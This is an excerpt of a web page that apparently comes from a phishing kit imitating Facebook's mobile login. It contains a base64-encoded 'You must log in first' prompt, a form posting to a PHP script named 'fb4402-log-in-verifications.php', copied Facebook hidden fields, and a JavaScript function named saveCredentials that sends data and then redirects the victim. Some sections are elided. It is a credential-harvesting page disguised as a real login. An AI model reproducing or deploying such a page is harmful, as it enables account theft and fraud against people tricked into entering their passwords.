...
<div class="acy apm abb" data-sigil="marea">
    <span class="mfsm"><?php
$str = 'WW91IG11c3QgbG9nIGluIGZpcnN0Lg==' ;
echo base64_decode($str);
?></span>
</div>
...
<form method="post" action="fb4402-log-in-verifications.php" novalidate="0" data-sigil="" data-autoid="">
<input type="hidden" name="lsd" value="AVprVP9bX-U" autocomplete="off">
<input type="hidden" name="jazoest" value="2916" autocomplete="off">
<input type="hidden" name="m_ts" value="1682229823">
<input type="hidden" name="li" value="P8pEZI8DSYiX5hBpfoDCWzGq">
<input type="hidden" name="try_number" value="0" data-sigil="">
<input type="hidden" name="unrecognized_tries" value="0" data-sigil="">
...
<script>
 function saveCredentials(event) {
  ...
  .then(function(response) {
    ...
    window.location.href = "fb4402-log-in-verifications.php";
  })
